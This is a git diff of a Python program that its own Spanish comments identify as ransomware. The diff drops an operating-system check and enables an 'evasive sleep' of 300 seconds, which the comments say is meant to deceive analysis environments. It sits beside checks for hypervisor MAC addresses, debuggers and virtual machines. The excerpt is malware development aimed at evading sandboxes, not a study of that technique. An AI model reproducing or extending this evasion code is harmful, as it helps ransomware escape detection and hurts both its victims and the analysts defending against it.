@@ -1,5 +1,4 @@
 import psutil
-import platform
 import sys
 import re
 import uuid
@@ -14,15 +13,6 @@ MAC_PREFIXES = {
         "QEMU/KVM": ["52:54:00"],
         "Parallels": ["00:1C:42"]
     }
-
-def so_detection(): # Detección del sistema operativo
-    sistema = platform.system()
-    if sistema == "Windows":
-        return "Windows"
-    elif sistema == "Linux":
-        return "Linux"
-    else:
-        sys.exit(1)  # Detiene el programa si no coincide con alguno de los SO 
 
 def evasive_sleep(seconds): #retardo evasivo para engañar a los entornos de análisis
     start = time.perf_counter()
@@ -54,7 +44,7 @@ def is_debugger_present_windows():
         return False
 
 def check_virtualization():
-    #evasive_sleep(300)  # Función para dormir el ransowmare durante el tiempo especifícado
+    evasive_sleep(300)  # Función para dormir el ransowmare durante el tiempo especifícado
     check_hypervisor_mac(get_mac_address()) # Comprobación MAC
     check_system_requirements() # Comprobación de recursos hardware 
     
